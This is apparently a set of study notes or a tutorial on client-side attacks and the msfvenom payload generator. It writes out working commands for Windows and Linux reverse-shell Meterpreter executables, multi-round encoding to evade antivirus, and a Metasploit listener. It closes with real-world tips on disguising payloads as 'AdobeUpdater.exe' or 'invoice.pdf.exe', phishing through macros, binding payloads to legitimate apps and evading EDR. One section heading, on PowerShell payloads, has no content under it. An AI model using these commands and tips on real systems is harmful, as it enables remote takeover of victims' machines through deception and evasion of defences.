## **Client-side Attacks**

- **Definition:** A client-side attack targets the end-user (client) rather than a server or service. It involves tricking the user into executing a malicious payload on their system. Once executed, the payload typically initiates a reverse connection back to the attacker.
    
- **Techniques:** These attacks often rely heavily on **social engineering** tactics, such as:
    
    - Sending **malicious email attachments** (e.g., Word documents with macros)
        
    - Distributing **infected portable executables (PEs)**
        
    - Embedding exploits in **malicious websites** or **drive-by downloads**
        
- **Target Vector:** Instead of exploiting software vulnerabilities on the system, they exploit **human weaknesses** — like curiosity or lack of awareness.
    
- **Persistence & Detection:** Since these attacks involve **transferring files to disk**, they are at high risk of being detected by antivirus (AV) or endpoint detection and response (EDR) tools. Obfuscation and payload encoding are often necessary to evade detection.
    
- **Common Payload Goal:** Establish a **reverse shell** or **Meterpreter session** that gives the attacker remote control over the victim's system.
    

---

## **Msfvenom**

- **Purpose:** `msfvenom` is a powerful command-line utility used to **generate, encode, and output Metasploit payloads** in various formats for use in client-side and server-side exploitation.
    
- **Background:** It merges the functionalities of two older tools:
    
    - `msfpayload` – for payload generation
        
    - `msfencode` – for payload encoding/obfuscation
        
- **Use Cases:** Msfvenom can create payloads for:
    
    - Windows (e.g., `.exe`, `.ps1`)
        
    - Linux (e.g., ELF binaries, bash scripts)
        
    - Web (e.g., PHP, ASP, JSP)
        
    - Documents (e.g., `.docm`, macros)
        
- **Example:** Generate a Windows reverse TCP Meterpreter executable:
    
    ```bash
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe -o payload.exe
    ```
    
- **Payload Formats:** Supports multiple output formats:
    
    - `exe`, `elf`, `macho`, `raw`
        
    - `psh`, `vbs`, `asp`, `php`, `jsp`
        
    - `c`, `rb`, `python` for embedding into scripts
        
- **Encoding:** To evade AV detection, payloads can be **encoded** using built-in encoders:
    
    ```bash
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o payload.exe
    ```

# 🔥 **Complete Guide to Using Msfvenom (2025 Edition)**

---

## 🧠 **What is Msfvenom?**

`msfvenom` is a CLI utility in the Metasploit Framework that:

- Generates payloads
    
- Encodes payloads (for AV evasion)
    
- Outputs them in various formats for use in exploitation
    

> It combines the old `msfpayload` and `msfencode` tools into one.

---

## 🛠️ **Basic Syntax**

```bash
msfvenom -p <payload> LHOST=<IP> LPORT=<PORT> [options]
```

### Flags Breakdown:

| Option       | Description                                                |
| ------------ | ---------------------------------------------------------- |
| `-p`         | Payload to use (e.g. `windows/meterpreter/reverse_tcp`)    |
| `LHOST`      | IP address of the attacker (you)                           |
| `LPORT`      | Listening port on your machine                             |
| `-f`         | Format (e.g. `exe`, `elf`, `raw`, `c`, `asp`, `php`, etc.) |
| `-o`         | Output file name                                           |
| `-e`         | Encoder (e.g. `x86/shikata_ga_nai`)                        |
| `-i`         | Number of iterations for encoding                          |
| `--platform` | Target OS (e.g. windows, linux)                            |
| `--arch`     | Architecture (e.g. x86, x64)                               |

### 1. **Windows EXE Reverse Shell**

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o shell.exe
```

> Output: `shell.exe` – ready to be delivered via USB, email, or fake software

---

### 2. **Linux ELF Reverse Shell**

```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f elf -o shell.elf
```

---

### 3. **Encoded Windows Payload (Bypass AV)**

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o encoded_shell.exe
```

> `-e x86/shikata_ga_nai`: polymorphic encoder  
> `-i 5`: encode 5 times (experiment with 3–10)

### 4. **PowerShell Payload**


## 📡 **Setting up the Listener (Metasploit)**

After generating the payload, open `msfconsole`:

```bash
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.100
set LPORT 4444
set ExitOnSession false
exploit -j
```

> Replace the payload with the one used in `msfvenom` to avoid mismatch.

## 🧠 **Tips for Real-World Usage**

- 🔐 **Encode smart**: Encoding isn't encryption. Use AV bypass tools like `Veil`, `Shellter`, or obfuscate manually for better results.
    
- 🕵️‍♂️ **Use legitimate names**: Rename `shell.exe` to something believable, like `AdobeUpdater.exe` or `invoice.pdf.exe`
    
- 💣 **Macro Delivery**: Combine with malicious VBA macros in Office docs for phishing
    
- 📦 **Bind payloads** to legit apps using tools like `msfvenom` + `msfvenom-converter` + `cat` or `Shellter`

## 💥 Final Words

Msfvenom is **not plug-and-play in the real world** — modern AV/EDR will eat your raw payloads alive. Think like an attacker:

- Modify the payload structure
    
- Obfuscate intelligently
    
- Blend with real traffic
    
- Use multi-staged delivery (maldoc → dropper → payload)
